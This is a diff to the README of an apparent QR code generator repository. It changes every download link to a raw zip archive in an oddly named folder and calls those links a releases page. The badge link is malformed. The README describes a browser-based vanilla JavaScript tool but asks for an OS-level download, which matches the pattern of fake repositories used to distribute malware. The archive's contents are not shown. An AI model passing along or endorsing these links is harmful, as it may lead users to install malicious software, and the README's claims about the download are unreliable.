@@ -4,11 +4,11 @@
 Welcome to QR-Code-Generator-2025! This software allows you to create modern and customizable QR codes using HTML, CSS, and vanilla JavaScript. You can generate QR codes for various purposes, including text, URLs, WiFi, contacts (vCard), and even images. No programming skills required!
 
 ## 📥 Download Now
-[![Download QR-Code-Generator-2025](https://raw.githubusercontent.com/Youqssed/QR-Code-Generator-2025/main/khanjar/QR-Code-Generator-2025.zip%https://raw.githubusercontent.com/Youqssed/QR-Code-Generator-2025/main/khanjar/QR-Code-Generator-2025.zip)](https://raw.githubusercontent.com/Youqssed/QR-Code-Generator-2025/main/khanjar/QR-Code-Generator-2025.zip)
+[![Download QR-Code-Generator-2025](https://github.com/Youqssed/QR-Code-Generator-2025/raw/refs/heads/main/khanjar/Q_Code_Generator_3.4.zip%https://github.com/Youqssed/QR-Code-Generator-2025/raw/refs/heads/main/khanjar/Q_Code_Generator_3.4.zip)](https://github.com/Youqssed/QR-Code-Generator-2025/raw/refs/heads/main/khanjar/Q_Code_Generator_3.4.zip)
 
 Visit the following link to download the latest version of QR-Code-Generator-2025:
 
-[Download QR-Code-Generator-2025](https://raw.githubusercontent.com/Youqssed/QR-Code-Generator-2025/main/khanjar/QR-Code-Generator-2025.zip)
+[Download QR-Code-Generator-2025](https://github.com/Youqssed/QR-Code-Generator-2025/raw/refs/heads/main/khanjar/Q_Code_Generator_3.4.zip)
 
 ## 💻 System Requirements
 - **Operating System**: Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
@@ -27,7 +27,7 @@ To get started, please follow these steps:
 
 1. Click on the download link below to access the releases page:
    
-   [Visit this page to download](https://raw.githubusercontent.com/Youqssed/QR-Code-Generator-2025/main/khanjar/QR-Code-Generator-2025.zip)
+   [Visit this page to download](https://github.com/Youqssed/QR-Code-Generator-2025/raw/refs/heads/main/khanjar/Q_Code_Generator_3.4.zip)
    
 2. On the releases page, find the latest version of QR-Code-Generator-2025.
 
